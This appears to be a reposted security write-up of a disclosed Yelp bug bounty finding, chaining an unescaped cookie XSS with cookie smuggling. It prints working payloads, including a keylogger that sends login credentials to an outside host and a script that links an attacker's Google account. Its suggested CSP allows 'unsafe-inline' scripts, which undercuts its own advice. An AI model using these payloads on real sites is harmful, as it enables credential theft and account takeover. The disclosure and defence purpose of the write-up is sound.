# :globe_with_meridians: Yelp XSS Flaw Opens the Door to Account Takeovers

> **Original Source:** [Yelp XSS Flaw Opens the Door to Account Takeovers](https://infosecwriteups.com/yelp-xss-flaw-opens-the-door-to-account-takeovers-3c058a87dc3e)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# Yelp XSS Flaw Opens the Door to Account Takeovers


## Chaining Cookie Smuggling and XSS for Devastating Yelp Account Compromise


### Introduction


In a striking revelation from a security researcher, a critical Cross-Site Scripting (XSS) vulnerability combined with a cookie parsing flaw in Yelp’s infrastructure was uncovered, exposing users to severe risks like keylogging and account takeovers. This sophisticated exploit, reported via Yelp’s bug bounty program, demonstrates how seemingly minor oversights can cascade into catastrophic breaches. Let’s dive into the mechanics of this vulnerability, its exploitation, and how to safeguard against it.

## The Anatomy of the Flaw


At the heart of this vulnerability lies Yelp’s handling of the `guvo` cookie, which is reflected unescaped in the HTML of key pages like `www.yelp.com` and `biz.yelp.com/login`. This oversight allows attackers to inject malicious JavaScript payloads. Compounding the issue, a cookie parsing error in Yelp’s backend enables attackers to smuggle the `guvo` cookie inside another cookie, `yelpmainpaastacanary`, using a URL query parameter (`?canary=`). Together, these flaws create a persistent XSS attack vector that can linger in a victim’s browser indefinitely.

## XSS via Unescaped `guvo` Cookie


The `guvo` cookie’s value is embedded directly into the `window.ySitRepParams` object and `window.yelp.guv` property without proper sanitization. For example, setting the `guvo` cookie to `</script><script>alert(1)</script>` results in the payload being executed on pages like Yelp’s homepage or business login page. This reflection happens because the backend fails to escape special characters, allowing attackers to inject arbitrary JavaScript.

## Cookie Smuggling with `yelpmainpaastacanary`


Yelp’s infrastructure allows the `yelpmainpaastacanary` cookie to be set via a URL query parameter, such as `https://www.yelp.com/?canary=asdf`. The response includes a `Set-Cookie` header:


```
Set-Cookie: yelpmainpaastacanary=asdf; Domain=.yelp.com; Path=/; Secure; SameSite=Lax
```


However, Yelp’s backend parses cookies incorrectly, splitting them by spaces instead of semicolons. For instance, a cookie header like `Cookie: a=1 b=2;` is mistakenly parsed as two cookies (`a=1` and `b=2`) instead of a single cookie (`a=1 b=2`). Attackers exploit this by crafting a URL like:


```
<https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E>
```


This sets the `yelpmainpaastacanary` cookie to `asdf guvo=</script><script>alert(1)</script>`, which the backend misinterprets, smuggling the `guvo` cookie with the XSS payload. Adding a `Max-Age=99999999` attribute ensures the cookie persists, triggering the payload on every visit to Yelp’s homepage.

## Exploitation in Action


The researcher, known as `lil_endian`, demonstrated two devastating proof-of-concept (PoC) attacks leveraging this vulnerability: a keylogger on the business login page and an account takeover via Google account linking.

## PoC 1: Keylogger on `biz.yelp.com/login`


The first exploit deploys a JavaScript keylogger to steal credentials from the business login page. The payload captures the email and password fields and sends them to an attacker-controlled domain (`calc.sh`):


```
setTimeout(function () {
a = document.getElementsByName('password')[0];
b = document.getElementsByName('email')[0];
function f() {
fetch(`https://calc.sh/?a=${encodeURIComponent(a.value)}&b=${encodeURIComponent(b.value)}`);
}
a.form.onclick=f;
a.onchange=f;
b.onchange=f;
a.oninput=f;
b.oninput=f;
}, 1000)
```


This payload is encoded and embedded into the `guvo` cookie using a URL like:


```
<https://yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Eeval%28atob%28%27>[Base64-encoded payload]%27%29%29%2F%2F%3BMax%2DAge%3D99999999
```


When a victim visits this link, the keylogger is installed, capturing credentials the next time they log into `biz.yelp.com`. The persistent cookie ensures the attack remains active until the cookie is cleared or expires.

## PoC 2: Account Takeover via Google Account Linking


The second exploit links an attacker’s Google account to a victim’s Yelp account, enabling full account takeover. The attack involves:


- Obtaining a valid `id_token` by linking the attacker’s Google account to their own Yelp account and intercepting the POST request to `[https://www.yelp.com/google_connect/register](https://www.yelp.com/google_connect/register.)`[.](https://www.yelp.com/google_connect/register.)

- Crafting an XSS payload that extracts a CSRF token from `https://www.yelp.com/profile_sharing` and submits a POST request to link the attacker’s Google account:


```
(function f() {
a = new XMLHttpRequest();
a.addEventListener('load', function () {
rx = /"GoogleConnect": "([^"]*)/;
id_token = "[attacker's id_token]";
b = rx.exec(this.responseText);
fetch("<https://www.yelp.com/google_connect/register>", {
"method": "POST",
"body": new URLSearchParams({"id_token": id_token, "csrftok": b[1]})
});
});
a.open('GET', '<https://www.yelp.com/profile_sharing>');
a.send();
})();
```


This payload is delivered via a malicious URL, similar to the keylogger exploit. Once the victim visits the link, the attacker’s Google account is linked to their Yelp account, allowing the attacker to sign in using Google credentials.

## Impact: A Ticking Time Bomb


The chained vulnerabilities have severe consequences:


- Business Account Compromise: The keylogger can steal credentials for Yelp business accounts, granting attackers access to sensitive business data and controls.

- Persistent Account Takeover: Linking an attacker’s Google account enables complete control over a victim’s Yelp account, bypassing traditional authentication.

- Scalable Attacks: The malicious link can be distributed via Yelp’s forums, reviews, or private messages, targeting a wide range of users.

- Long-Term Threat: The `Max-Age=99999999` attribute ensures the malicious cookie persists, compromising users whenever they visit Yelp until the cookie is removed.


This vulnerability’s stealth and persistence make it particularly dangerous, as victims may remain unaware of the compromise until it’s too late.

## Mitigation Strategies


To neutralize this threat, Yelp and its users should adopt the following measures:


- Sanitize Cookie Reflections:


- Escape the `guvo` cookie’s value before embedding it in `window.ySitRepParams` or `window.yelp.guv`.

- Use a sanitization library to strip malicious characters like `<`, `>`, or `"`.


2. Fix Cookie Parsing:


- Update the backend to correctly parse cookies using semicolons, preventing smuggling attacks.

- Validate and sanitize the `yelpmainpaastacanary` cookie value to reject malicious inputs.


3. Implement Content Security Policy (CSP):


- Deploy a strict CSP to block unauthorized scripts, such as:


```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; object-src 'none'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; frame-src 'none'
```


4. Restrict Query Parameter Usage:


- Disable or validate the `?canary` parameter to prevent arbitrary cookie setting.

- Limit cookie attributes like `Max-Age` to reasonable values.


5. Enhance CSRF Protections:


- Strengthen CSRF token validation for sensitive actions like Google account linking.

- Use SameSite=Strict for critical cookies to reduce XSS impact.


6. User Awareness:


- Educate users to avoid clicking suspicious links in Yelp forums or messages.

- Encourage clearing cookies periodically to remove persistent malicious payloads.

## The Power of Bug Bounties


This vulnerability, reported by `lil_endian` through Yelp’s HackerOne program, underscores the critical role of bug bounty programs in uncovering complex, high-impact flaws. The researcher’s detailed proofs-of-concept, including a keylogger and account takeover, highlight the ingenuity of attackers and the importance of proactive security testing. Yelp’s swift response and bounty reward reflect a commitment to securing its platform.

## Conclusion: Locking Down the Digital Front Door


The Yelp XSS vulnerability reveals how a seemingly small oversight — unescaped cookie reflection and flawed parsing — can spiral into a full-blown account takeover. By chaining XSS with cookie smuggling, attackers could silently compromise users, from business owners to casual reviewers. This case serves as a stark reminder for developers to prioritize input validation, secure cookie handling, and robust security headers. For Yelp users, staying vigilant and adopting secure browsing habits is crucial to staying safe in an interconnected digital world.


## Get Monika sharma’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


For more details, explore the original HackerOne report ([2010530](https://hackerone.com/reports/2010530)) and Yelp’s security advisories.

---

*Originally published on [Medium](https://infosecwriteups.com/yelp-xss-flaw-opens-the-door-to-account-takeovers-3c058a87dc3e). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
